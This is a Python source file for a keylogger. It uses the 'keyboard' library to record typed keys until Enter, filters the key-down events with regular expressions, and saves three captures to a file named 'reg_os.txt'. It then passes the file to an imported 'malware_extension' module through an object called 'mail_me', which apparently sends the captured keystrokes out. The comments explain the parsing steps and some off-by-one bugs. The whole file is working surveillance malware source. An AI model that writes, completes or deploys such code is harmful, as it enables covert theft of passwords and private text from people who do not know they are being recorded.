import keyboard
import re
import malware_extension
# NOTE when ordered_list, down_keys_string & extracted_ordered_string where declared as global variables
# a problem was observed which was that if hi was recorded first then next time instead of recording
# new instance it would continue to iterate in while loop in keylog function and execute the number of
# time the loop was executed such as h i h i h i a l l for 3 times because global variables wouldn't let
# the variable to be cleared out instead it would append to it.


def keylogs():
    keylog = keyboard.record(until='enter')
    return keylog


# NOTE Logic of this program was that to convert the list of keys entered into normal format from
# KeyboardEvent.(..) to ..  .So first function keylogs does the work of capturing keys.
def keyboard_input_list_to_ordered_list(unordered_list):
    ordered_list = []
    length_of_unordered_list = len(unordered_list)
    length_of_unordered_list = length_of_unordered_list - 1
    i = 0
    while i < length_of_unordered_list:
        key_elements = str(unordered_list[i])
        ordered_list.append(key_elements)
        i = i+1
    return ordered_list
# So first step from conversion to KeyboardEvent.(..) to .. was converting the list into string {String
# because string has functionality to use endswith() and re module}. Since individual element where
# keyboardEvent and not string converted it into string process was first to get length of sting and
# then convert till end element by continuing appending it into list converted into list for ease of
# access to re module and endswith() funtion.Declared i as 0 because length of string obtained is greater
# by 1 than obtained through len() function if len()=10 real =9 now when loop starts form zero it ends
# i at 8 and since 0 is included it totals to 9 hence complete list is traversed except
# KeyboardEvent(enter down) which we know and don't want to be included.


def re_module_down_keys_string(unordered_list):
    down_keys_string = ""
    length_of_unordered_list = len(unordered_list)
    length_of_unordered_list = length_of_unordered_list - 1
    i = 0
    while i < length_of_unordered_list:
        check_down = unordered_list[i].endswith('down)')
        if check_down == True:
            key_elements = str(unordered_list[i])
            down_keys_string += key_elements
            i = i+1
        else:
            i = i+1
    return down_keys_string
# SO in second step as key going down as well as up where registered we only needed down key list so
# used endswith() function and fltered out down keys and then with similar tatics used earlier and
# list was traverse returning a string for the next process which uses re module whose need is string
# or list of string. IN our case string.


def re_module_list_to_string(unordered_list):
    extracted_ordered_string = ""
    unordered_list = re.findall("KeyboardEvent.(..)", unordered_list)
    length_of_unordered_list = len(unordered_list)
    length_of_unordered_list = length_of_unordered_list - 1
    i = 0
    while i <= length_of_unordered_list:
        key_elements = str(unordered_list[i])
        extracted_ordered_string += key_elements
        i = i+1

    return extracted_ordered_string
# In above case unordered_list is not a list actually a string.Here re module does its work and filter
# out only keys for us form the whole  KeyboardEvent.(..) content to .. here re module returns a list
# so following same tatic and converting it to string and forwarding the final result which is later
# captured by keystorkes function for further use by malware-extension module
# NOTE in above function if i is smaller by 1 from length of list it results to removal of end letter
# form word such as happy is shown as happ

# Declared i as 0 because length of string obtained is greater
# by 1 than obtained through len() function if len()=10 real =9 now when loop starts form zero it ends
# i at 8 and since 0 is included it totals to 9 hence complete list is traversed as i= length of list
# in this case.


def keystrokes():

    keylog = keylogs()
    converted_list = keyboard_input_list_to_ordered_list(keylog)
    down_keys_only_string = re_module_down_keys_string(converted_list)
    filtered_keys = re_module_list_to_string(down_keys_only_string)
    return filtered_keys


mail_me = malware_extension.Extension()
file_name = "reg_os.txt"
i = 1
while i <= 3:
    keys = keystrokes()
    mail_me.store_data(file_name, keys)
    i = i+1
mail_me.start(file_name)
